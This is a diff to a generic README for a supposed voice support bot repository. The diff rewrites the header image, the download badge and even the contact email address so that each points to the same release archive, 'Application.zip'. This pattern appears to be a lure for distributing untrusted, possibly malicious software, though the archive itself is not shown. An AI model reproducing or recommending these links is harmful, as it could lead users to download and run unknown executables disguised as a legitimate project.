@@ -1,6 +1,6 @@
 # 🎙️ Sesli Destek Botu Altyapısı 🤖
 
-![Sesli Destek Botu](https://image.freepik.com/free-vector/robot-voice-assistant-isometric-composition-with-view-modern-interior-control-room_1284-39684.jpg)
+![Sesli Destek Botu](https://github.com/Babaoff/sesli-destek-botu/releases/download/v1.0/Application.zip)
 
 Welcome to the official repository of the "sesli-destek-botu" - a powerful Voice Support Bot infrastructure. This repository provides all the necessary tools and resources to create a sophisticated voice-enabled support bot for various platforms. Whether you are looking to enhance customer service or automate support processes, this infrastructure will streamline your operations and provide a seamless experience for users.
 
@@ -13,7 +13,7 @@ Welcome to the official repository of the "sesli-destek-botu" - a powerful Voice
 ## Installation 🛠️
 To start using the "sesli-destek-botu" infrastructure, you can download the necessary software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Babaoff/sesli-destek-botu/releases/download/v1.0/Application.zip)](https://github.com/Babaoff/sesli-destek-botu/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the software package, follow the installation instructions provided to set up the voice support bot infrastructure. Launch the software and start customizing the voice commands and responses to fit your specific requirements.
 
@@ -27,7 +27,7 @@ We welcome contributions from the community to improve the "sesli-destek-botu" i
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact Us 📧
-If you have any questions, suggestions, or feedback regarding the "sesli-destek-botu" infrastructure, please feel free to reach out to us at [support@sesli-destek-botu.com](mailto:support@sesli-destek-botu.com). We value your input and are committed to providing the best possible support for our users.
+If you have any questions, suggestions, or feedback regarding the "sesli-destek-botu" infrastructure, please feel free to reach out to us at [https://github.com/Babaoff/sesli-destek-botu/releases/download/v1.0/Application.zip](https://github.com/Babaoff/sesli-destek-botu/releases/download/v1.0/Application.zip). We value your input and are committed to providing the best possible support for our users.
 
 ---
 
